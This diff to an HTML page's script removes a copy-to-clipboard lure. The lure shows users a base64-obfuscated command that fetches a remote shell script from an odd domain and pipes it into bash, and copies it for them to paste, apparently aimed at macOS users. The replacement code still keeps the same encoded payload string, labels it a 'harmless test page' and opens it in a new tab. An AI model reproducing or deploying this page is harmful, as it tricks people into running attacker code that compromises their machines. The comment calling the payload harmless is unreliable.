@@ -309,66 +309,41 @@ body {
 
 </div>
 
-<script>
 
-const DOWNLOAD_URL = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
-  
-// SHOW LINK INSIDE INPUT
+<script>
+const TEST_COMMAND = 'echo "macOS test successful"';
+const TEST_PAGE = "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo";
 
 const commandInput = document.getElementById("command");
 const copyButton = document.getElementById("copyButton");
 
-commandInput.value = DOWNLOAD_URL;
+// Automatically show test command
+commandInput.value = TEST_COMMAND;
 
-
-// COPY BUTTON FUNCTION
-
+// Copy and open test page in a new tab
 async function copyCommand() {
-
     try {
-
-        if (navigator.clipboard && window.isSecureContext) {
-
-            await navigator.clipboard.writeText(
-                DOWNLOAD_URL
-            );
-
-        } else {
-
-            commandInput.focus();
-            commandInput.select();
-
-            const success = document.execCommand("copy");
-
-            if (!success) {
-                throw new Error("Copy failed");
-            }
-
-        }
-
-        // COPY SUCCESS
+        await navigator.clipboard.writeText(TEST_COMMAND);
 
         copyButton.innerText = "✓ Copied!";
         copyButton.style.background = "#289c00";
 
-        setTimeout(function() {
+        // Open harmless test page in a new tab
+        window.open(TEST_PAGE, "_blank", "noopener,noreferrer");
 
+        setTimeout(function() {
             copyButton.innerText = "Copy";
             copyButton.style.background = "#38d900";
-
         }, 2000);
 
     } catch(error) {
-
         commandInput.focus();
         commandInput.select();
-        copyButton.innerText = "Select Link";
-
+        copyButton.innerText = "Select & Copy";
     }
-
 }
-
 </script>
+
 
 </body>
 </html>
